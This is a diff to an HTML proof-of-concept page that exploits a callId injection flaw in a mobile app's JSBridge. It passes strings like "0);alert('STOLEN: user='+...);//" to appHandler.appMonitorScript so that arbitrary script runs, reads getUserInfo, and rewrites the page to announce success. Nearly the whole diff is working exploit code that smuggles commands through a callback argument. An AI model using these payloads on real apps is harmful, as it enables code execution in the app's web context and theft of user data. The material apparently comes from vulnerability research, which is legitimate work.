@@ -12,6 +12,11 @@ body{background:#0d0d0d;color:#fff;font-family:monospace;padding:20px;font-size:
 <h3 style="color:#c9a96e">JSBridge callId Injection PoC</h3>
 <div id="log"></div>
 <script>
+// ★ 关键：必须定义 sep 对象，否则回调 sep._onSuccess(0) 会报错！
+window.sep = {};
+sep._onSuccess = function(id,d){ L('callback fired on: '+location.origin,'ok') };
+sep._onFailure = function(id,e){ L('callback failed: '+e,'err') };
+
 function L(s,c){document.getElementById('log').innerHTML+='<div class="'+(c||'')+'">'+s+'</div>'}
 
 if(typeof appHandler==='undefined'){
@@ -21,27 +26,19 @@ if(typeof appHandler==='undefined'){
   var u=appHandler.getUserInfo();
   L('getUserInfo: "'+u+'"','ok');
 
-  // Test 1: alert (proven to work)
-  L('sending test1 (alert)...','info');
+  // Test 1: alert with getUserInfo
+  L('sending test1...','info');
   appHandler.appMonitorScript('getExpFlag',
-    "0);alert('user='+appHandler.getUserInfo());//",
-    '{"expKey":"a"}');
+    "0);alert('STOLEN: user='+appHandler.getUserInfo());//",
+    '{"expKey":"test"}');
 
-  // Test 2: document.title (very simple DOM change)
+  // Test 2: after 1s, change page
   setTimeout(function(){
-    L('sending test2 (title)...','info');
+    L('sending test2...','info');
     appHandler.appMonitorScript('getExpFlag',
-      "0);document.title='PWNED_BY_CALLID';//",
-      '{"expKey":"b"}');
+      "0);document.title='PWNED';document.body.innerHTML='<h1 style=color:#fff;background:#c00;padding:40px;margin:0>CALLID INJECTION SUCCESS<br>getUserInfo: '+appHandler.getUserInfo()+'</h1>';//",
+      '{"expKey":"test"}');
   },1000);
-
-  // Test 3: background color change (no HTML, no innerHTML)
-  setTimeout(function(){
-    L('sending test3 (bgcolor)...','info');
-    appHandler.appMonitorScript('getExpFlag',
-      "0);document.body.style.background='#cc0000';document.body.style.color='#fff';document.body.innerHTML='CALLID INJECTION SUCCESS<br>getUserInfo='+appHandler.getUserInfo();//",
-      '{"expKey":"c"}');
-  },2000);
 }
 </script>
 </body>
